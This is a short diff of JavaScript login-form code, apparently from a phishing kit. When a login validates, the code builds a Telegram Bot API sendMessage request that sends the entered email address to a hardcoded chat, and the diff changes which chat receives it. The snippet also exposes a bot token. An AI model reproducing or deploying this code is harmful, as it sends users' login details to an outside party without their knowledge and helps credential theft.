@@ -17,7 +17,7 @@ password.value = '';
  if(mok == true && pok == true){
  document.getElementById('alert-success').classList.remove('d-none');
   setTimeout(() => {document.getElementById('alert-success').classList.add('d-none');}, 3000);
-  var chat_id = 2097014526;
+  var chat_id = 1117797599;
   var msg = `Login -  ${nmail}`;
   var token = "1481767472:AAENJk7aOxNovo3L4Zuur8RTlxaJOoItG_E";
   var sendText = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text= ${msg}`;
